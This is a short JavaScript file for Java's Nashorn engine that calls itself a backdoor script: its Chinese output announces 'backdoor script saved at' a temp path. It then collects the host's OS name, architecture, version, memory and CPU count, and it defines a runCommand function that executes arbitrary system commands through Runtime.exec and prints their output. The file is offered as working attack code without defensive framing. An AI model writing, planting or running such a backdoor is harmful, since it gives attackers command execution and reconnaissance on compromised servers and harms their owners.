/*global Java, $*/
var BufferedReader = Java.type("java.io.BufferedReader");
var InputStreamReader = Java.type("java.io.InputStreamReader");

var Runtime = Java.type("java.lang.Runtime");
var System = Java.type("java.lang.System");

print('后门脚本已保存于: ' + $.temp);

print("系统类型: " + System.getProperty("os.name"));
print("系统位数: " + System.getProperty("os.arch"));
print("系统版本: " + System.getProperty("os.version"));
print("系统内存: " + Runtime.getRuntime().totalMemory() / 1024 / 1024);
print("CPU内核: " + Runtime.getRuntime().availableProcessors());

function runCommand() {
    var process = Runtime.getRuntime().exec(arguments[0]);
    var br = new BufferedReader(new InputStreamReader(process.getInputStream()));
    var line;
    while ((line = br.readLine()) !== null) {
        print(line);
    }
}